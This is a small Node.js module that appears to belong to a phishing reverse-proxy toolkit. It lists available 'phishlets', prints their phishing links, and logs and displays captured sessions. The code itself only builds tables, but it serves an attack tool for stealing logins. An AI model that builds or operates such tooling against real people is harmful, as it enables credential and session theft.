const fs = require('fs');
const path = require('path');
const Table = require('console.table');
const { loadConfig } = require('./config');

const captures = [];

function showInitialTable() {
  const config = loadConfig();
  const proxyPageDir = path.join(__dirname, 'proxy_page');
  const phishlets = fs.readdirSync(proxyPageDir).filter(file => file.endsWith('.js')).map(file => file.replace('.js', ''));
  const table = phishlets.map(phishlet => ({
    ProxyPage: phishlet,
    Domain: config.domain || 'N/A',
    PhishingLink: `${config.SCHEME}://${config.LOCAL_URL}:${config.PORT}`,
    IP: config.LOCAL_URL,
  }));
  console.table(table);
}

function showSessionTable() {
  console.table(captures);
}

function logCapture(data) {
  captures.push(data);
}

module.exports = { showInitialTable, showSessionTable, logCapture };